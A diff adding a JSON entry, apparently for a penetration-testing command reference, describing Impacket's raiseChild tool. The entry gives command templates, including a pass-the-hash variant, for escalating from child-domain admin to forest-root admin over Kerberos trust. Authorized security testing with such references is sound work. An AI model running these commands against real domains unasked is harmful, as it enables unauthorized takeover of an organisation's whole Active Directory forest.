@@ -1,0 +1,32 @@
+{
+  "id": "impacket-raiseChild",
+  "name": "Impacket raiseChild",
+  "command": "impacket-raiseChild '<child_domain>/<user>:<password>' -target-exec '<ip>'",
+  "description": "Escalate from child domain DA to forest root DA via inter-realm Kerberos trust",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "kerberos",
+    "ldap"
+  ],
+  "tags": [
+    "impacket",
+    "raisechild",
+    "forest",
+    "trust",
+    "domain-escalation",
+    "sid-history"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-raiseChild -hashes ':<hash>' '<child_domain>/<user>' -target-exec '<ip>'"
+    }
+  ],
+  "examples": [
+    "impacket-raiseChild 'child.corp.local/domainadmin:password' -target-exec '192.168.1.1'"
+  ]
+}
